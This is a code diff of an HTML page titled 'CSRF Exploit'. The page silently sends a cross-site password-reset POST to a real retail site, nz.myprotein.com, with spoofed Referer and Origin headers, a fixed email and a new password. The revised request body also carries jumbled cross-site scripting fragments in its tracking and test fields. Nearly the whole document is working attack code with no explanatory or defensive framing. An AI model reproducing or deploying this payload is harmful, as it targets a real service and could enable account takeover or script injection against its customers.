@@ -1,26 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Exploit</title>
+<title>CSRF Exploit</title>
 </head>
 <body>
-    <script>
-        fetch("https://nz.myprotein.com/passwordReset.account", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Referer": "https://nz.myprotein.com/",
-                "Origin": "https://nz.myprotein.com/"
-            },
-            body: `resetRequest=1&customerEmail=test@test.com&newPassword=test&utm_source="normaltest&test=testing
-
-normaltest
-
-`
-        }).finally(() => {
-            // Redirect to nz.myprotein.com after request completes
-            window.location.href = "https://nz.myprotein.com/";
-        });
-    </script>
+<script>
+fetch("https://nz.myprotein.com/passwordReset.account", {
+method: "POST",
+headers: {
+"Content-Type": "application/x-www-form-urlencoded",
+"Referer": "https://nz.myprotein.com/",
+"Origin": "https://nz.myprotein.com/"
+},
+body: `resetRequest=1&customerEmail=test@test.com&newPassword=testing123&confirmPassword=testing123&wechatSetPassword=testing123&utm_source=test">'-alert()-'&test">"""<"
+"scr"ipt"
+"
+"
+a"lert(")""<"
+/script><
+!--//`
+});
+</script>
 </body>
 </html>
